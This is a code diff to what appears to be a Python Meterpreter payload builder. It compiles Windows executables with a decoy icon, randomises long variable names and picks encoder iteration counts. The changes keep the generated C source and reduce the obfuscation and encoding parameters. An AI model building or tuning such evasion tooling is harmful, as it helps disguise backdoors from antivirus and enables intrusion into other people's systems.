@@ -234,8 +234,8 @@ def Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON):
                 EXE = ['x86_64-w64-mingw32-gcc', 'source.c', 'icon/AccessMe.res', '-s', '-o', FILENAME,'-mwindows']
                 subprocess.run(EXE, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
-                RM_SourceFile = ['rm', 'source.c']
-                subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
+                #RM_SourceFile = ['rm', 'source.c']
+                #subprocess.run(RM_SourceFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
 
                 RM_RcFile = ['rm', 'icon/AccessMe.rc']
                 subprocess.run(RM_RcFile, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
@@ -506,14 +506,14 @@ def Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE):
 
 #Varname creator
 def Varname_Creator():
-    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(5647,10478)))
+    Varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8888,9999)))
     return Varname
 
 
 
 #Random meterpreter encoder iteration
 def Random_Encoder_Iteration():
-    iteration = str(random.randint(30, 60))
+    iteration = str(random.randint(1, 3))
     return iteration
 
 
